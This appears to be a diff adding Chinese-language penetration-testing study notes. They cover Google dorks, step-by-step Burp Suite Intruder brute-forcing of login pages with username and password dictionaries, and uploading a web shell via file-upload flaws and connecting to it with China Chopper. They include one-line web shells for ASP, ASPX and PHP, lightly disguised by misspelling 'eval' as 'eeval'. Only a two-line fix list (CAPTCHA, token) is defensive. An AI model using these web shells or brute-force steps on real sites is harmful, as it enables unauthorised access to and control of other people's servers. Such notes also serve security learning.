@@ -1,0 +1,46 @@
+专注Web及移动安全：https://mp.weixin.qq.com/s/U2kAPZaAUjRf-3FqQon9aA
+
+黑客攻击思路：信息收集——>攻击测试——>提升权限——>扩大成果（内网漫游）——>清除痕迹
+渗透测试思路：信息收集——>攻击测试  
+
+暴力破解
+1、google黑语法 互联网中精确搜索到相要的东西
+在google浏览器中应用
+inurl：搜索URL网址中包含的指点字符串  inurl:login.php
+intitle：搜索网页中的标题名中是否包含指定字  intitle:登录
+intext：搜索网页正文内容中的指定字符  intext:登录
+2、burpsuite常用功能 常用的抓包工具抓http和https协议，修改数据包
+  1.拦截 Proxy的Options中配置代理服务器 本机代理127.0.0.1:8080
+  利用火狐代理插件配置代理也是本机代理127.0.0.1:8080
+  Proxy的Intercept要on状态 Forward把数据包发送给服务器 Drop把数据包丢掉 Action是把包发送到不同的目录栏进行对包的操作
+  2.抓包 burpsuite和浏览器配置好代理就能抓包
+  3.改包 抓到后直接在Proxy的Intercept中的Raw进行修改
+  4.重放 利用Action发到目录Repeater进行单步重放
+                   发到Intruder实现爆破，Positions的黄标是变量，Playloads配置参数，爆破是猜测账号密码
+3、后台暴力破解
+存在暴力破解的特点：登录数据包不存在验证码、token等一次性验证
+验证码爆破 登录爆破
+1.打开代理
+2.burnsuite里的option勾选代理
+3.点入burnsuite中的Intercept把状态设为“Intercept is on”拦截数据包
+4.输入账号和密码点击登录用burnsuite获取数据包发送到爆破模块“Send to Intruder”
+5.到爆破模块“Intruder”中的“Positions”Clear选中的黄块重新选中想要更改的变量，两个或以上的变量选择Attack type为Cluster bomb
+6.到“Payloads”选择两个变量的数据字典即想替换的数据所保存的username.txt和password.txt文件
+7.点击burnsuite左上角“Intruder”中的“Start attack”进行爆破
+8.在“results”查看status和length的不同查看数据包
+
+一句话木马（eval多了个e，去掉一个）
+ASP：<%eeval request("pass")%>
+aspx:<%@Page Language%><%eeval (Request.Item["pass"]."unsafe");%>
+php:<?php @eeval ($_POST['pass']);?>
+上传漏洞获取后台目录权限
+MIME多用途互联网邮件扩展类型：
+.jpeg或.jpg  image/jpeg  JPEG图形
+.html或htm  text/html  超文本标记语言文本
+.tar  application/x-tar  TAR文件
+.exe  application/octet-stream  下载文件类型
+上传php文件成功后通过“中国菜刀”软件输入php文件上传url地址和cmd，选择php类型，编码类型选GB2312
+
+防止暴力破解修复方案：
+1.添加验证码
+2.添加token
